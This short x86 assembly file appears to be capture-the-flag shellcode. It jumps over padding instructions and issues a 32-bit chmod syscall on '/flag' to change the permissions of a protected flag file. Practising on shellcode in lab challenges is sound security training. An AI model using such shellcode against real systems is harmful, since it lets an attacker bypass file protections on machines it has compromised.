.global _start
_start:
.intel_syntax noprefix
	mov al, 0xf 
	lea ecx, [rip+0xc]
	jmp rcx
	mov edx, 0x41
	mov edx, 0x42
	lea ebx, [rip+flag]
	mov cl, 0x24
	int 0x80
	mov edx, 0x43
	mov edx, 0x44
flag:
	.string "/flag"
